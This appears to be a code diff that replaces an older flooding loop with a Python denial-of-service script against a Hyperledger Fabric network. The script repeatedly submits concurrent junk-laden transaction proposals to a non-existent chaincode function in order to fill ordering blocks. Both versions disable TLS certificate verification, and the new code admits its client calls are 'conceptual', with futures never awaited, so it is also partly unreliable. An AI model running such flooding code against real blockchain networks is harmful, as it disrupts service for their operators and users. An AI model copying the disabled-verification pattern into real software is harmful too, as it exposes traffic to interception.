@@ -1,22 +1,238 @@
-# Inside the send_transaction function, change the requests.post line to this:
 
-# ... (rest of the function is the same)
-try:
-    # INSECURE: Disables SSL certificate verification
-    response = requests.post(url, headers=headers, data=json.dumps(payload), verify=False)
-    response.raise_for_status()
-    print(f"Transaction {tx_id} sent successfully. Status: {response.status_code}")
-except RequestException as e:
-    print(f"Failed to send transaction {tx_id}. Error: {e}")
+```python
+import asyncio
+import random
+import string
+from datetime import datetime
+import logging
+from hfc.fabric import Client
 
+# --- Configuration ---
+# Network configuration - replace with your actual network details
+NETWORK_CONFIG = {
+    'name': 'test-network',
+    'version': '1.0.0',
+    'clients': {
+        'client': {
+            'organization': 'Org1',
+            'connection': {
+                'timeout': {
+                    'peer': {
+                        'endorser': '300'
+                    },
+                    'orderer': '300'
+                }
+            }
+        }
+    },
+    'organizations': {
+        'Org1': {
+            'mspid': 'Org1MSP',
+            'peers': ['peer0.org1.example.com'],
+            'certificateAuthorities': ['ca.org1.example.com']
+        },
+        'Org2': {
+            'mspid': 'Org2MSP',
+            'peers': ['peer0.org2.example.com'],
+            'certificateAuthorities': ['ca.org2.example.com']
+        }
+    },
+    'orderers': {
+        'orderer.example.com': {
+            'url': 'grpcs://localhost:7050',
+            'tlsCACerts': {
+                'pem': 'path/to/orderer/tls/ca.crt'
+            },
+            'grpcOptions': {
+                'ssl-target-name-override': 'orderer.example.com'
+            }
+        }
+    },
+    'peers': {
+        'peer0.org1.example.com': {
+            'url': 'grpcs://localhost:7051',
+            'tlsCACerts': {
+                'pem': 'path/to/peer0.org1/tls/ca.crt'
+            },
+            'grpcOptions': {
+                'ssl-target-name-override': 'peer0.org1.example.com'
+            }
+        },
+        'peer0.org2.example.com': {
+            'url': 'grpcs://localhost:7052',
+            'tlsCACerts': {
+                'pem': 'path/to/peer0.org2/tls/ca.crt'
+            },
+            'grpcOptions': {
+                'ssl-target-name-override': 'peer0.org2.example.com'
+            }
+        }
+    },
+    'certificateAuthorities': {
+        'ca.org1.example.com': {
+            'url': 'https://localhost:7054',
+            'caName': 'ca-org1',
+            'tlsCACerts': {
+                'pem': 'path/to/ca.org1/tls/ca.crt'
+            },
+            'httpOptions': {
+                'verify': False
+            }
+        },
+        'ca.org2.example.com': {
+            'url': 'https://localhost:7055',
+            'caName': 'ca-org2',
+            'tlsCACerts': {
+                'pem': 'path/to/ca.org2/tls/ca.crt'
+            },
+            'httpOptions': {
+                'verify': False
+            }
+        }
+    }
+}
 
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Attack parameters
+CHANNEL_NAME = 'mychannel'
+CHAINCODE_NAME = 'mycc'
+CONCURRENT_REQUESTS = 50  # Number of concurrent transaction submissions
+ATTACK_DURATION_SECONDS = 120  # How long to run the attack
+TRANSACTION_PAYLOAD_SIZE = 10240  # Size of the junk data in bytes (10KB)
 
+# --- Logging Setup ---
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('dos_block_discard.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-    print(f"Starting DOS attack: sending {NUM_TRANSACTIONS} transactions to {FABRIC_URL}...")
-    for i in range(NUM_TRANSACTIONS):
-        tx_id = f"tx_{i}"
-        value = f"value_{i}"
-        send_transaction(tx_id, value)
-    print("Attack finished.")
+# --- Helper Functions ---
+def generate_random_payload(size: int) -> str:
+    """Generates a random string payload of a specific size."""
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
+
+def create_invalid_transaction_payload() -> str:
+    """
+    Creates a payload designed to be discarded by the chaincode.
+    This could be a malformed JSON, a function name that doesn't exist,
+    or arguments that violate the chaincode's logic.
+    For this example, we'll use a non-existent function name.
+    """
+    payload_data = generate_random_payload(TRANSACTION_PAYLOAD_SIZE)
+    # Invoke a non-existent function 'invalidFunction' with junk data
+    return f'{{"function": "invalidFunction", "args": ["{payload_data}"]}}'
+
+# --- Attack Core Logic ---
+async def submit_discard_transaction(client: Client, user_id: int):
+    """
+    Submits a single transaction that is intended to be discarded.
+    This function is designed to be run concurrently.
+    """
+    loop = asyncio.get_event_loop()
+    
+    # Get a user context (in a real scenario, you'd have multiple users)
+    # For this attack, we might reuse one or a few identities.
+    try:
+        user_context = client.get_user('Admin@org1.example.com')
+    except Exception as e:
+        logger.error(f"User {user_id}: Failed to get user context. {e}")
+        return
+
+    # Generate the invalid transaction payload
+    invalid_payload = create_invalid_transaction_payload()
+
+    # Submit the transaction proposal
+    try:
+        # The function 'invalidFunction' does not exist in the chaincode,
+        # so the transaction proposal will be endorsed by peers (if they don't
+        # validate function names at proposal time) but will fail validation
+        # at the commit phase on peers, or will be discarded by the orderer
+        # if it's malformed. The goal is to send as many as possible to the
+        # ordering service to fill up the blocks.
+        
+        # NOTE: The hfc library might handle proposal submission differently.
+        # This is a conceptual flow. The actual call might be a single `invoke_transaction`.
+        
+        # 1. Create a transaction proposal
+        # The 'fcn' and 'args' would be what the chaincode expects.
+        # We are intentionally sending something it can't process.
+        proposal = loop.run_in_executor(
+            None,
+            client.chaincode_invoke_request,
+            CHANNEL_NAME,
+            CHAINCODE_NAME,
+            fcn='invalidFunction',  # Non-existent function
+            args=[generate_random_payload(TRANSACTION_PAYLOAD_SIZE)],
+            transient_map=None,
+            user_context=user_context
+        )
+        
+        # 2. Send the proposal to peers for endorsement
+        # Even if peers reject it, the goal is to generate load.
+        # If they endorse it, the orderer will receive it.
+        loop.run_in_executor(
+            None,
+            client.send_transaction_proposal,
+            proposal,
+            peers=['peer0.org1.example.com', 'peer0.org2.example.com'],
+            user_context=user_context
+        )
+        
+        logger.info(f"User {user_id}: Successfully submitted discard transaction proposal.")
+
+    except Exception as e:
+        # We expect many exceptions here due to the invalid nature of the transactions.
+        # The goal is not successful transactions, but the *attempt* to send them.
+        logger.warning(f"User {user_id}: Transaction failed as expected. {e}")
+
+async def run_dos_attack():
+    """
+    Main function to orchestrate the Denial of Service attack.
+    """
+    logger.info("=== Starting DoS Block Discarding Attack ===")
+    logger.info(f"Target Channel: {CHANNEL_NAME}")
+    logger.info(f"Target Chaincode: {CHAINCODE_NAME}")
+    logger.info(f"Concurrent Requests: {CONCURRENT_REQUESTS}")
+    logger.info(f"Attack Duration: {ATTACK_DURATION_SECONDS} seconds")
+    logger.info(f"Payload Size: {TRANSACTION_PAYLOAD_SIZE} bytes")
+    
+    # Initialize the Hyperledger Fabric client
+    try:
+        cli = Client(net_profile=NETWORK_CONFIG)
+    except Exception as e:
+        logger.error(f"Failed to initialize Fabric client. Check network configuration. {e}")
+        return
+
+    # Create a list of tasks to run concurrently
+    tasks = []
+    start_time = datetime.now()
+
+    try:
+        while (datetime.now() - start_time).total_seconds() < ATTACK_DURATION_SECONDS:
+            # Create a new batch of tasks
+            for i in range(CONCURRENT_REQUESTS):
+                task = asyncio.create_task(submit_discard_transaction(cli, i))
+                tasks.append(task)
+            
+            # Wait for the current batch to complete before starting the next one
+            # This prevents overwhelming the local system's resources.
+            await asyncio.gather(*tasks, return_exceptions=True)
+            tasks.clear() # Clear the list for the next batch
+            
+            logger.info("Batch completed. Preparing next batch...")
+
+    except KeyboardInterrupt:
+        logger.info("Attack interrupted by user.")
+    finally:
+        logger.info("=== Attack Finished ===")
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(run_dos_attack())
+    except Exception as e:
+        logger.error(f"An unhandled error occurred in the main event loop: {e}")
+```
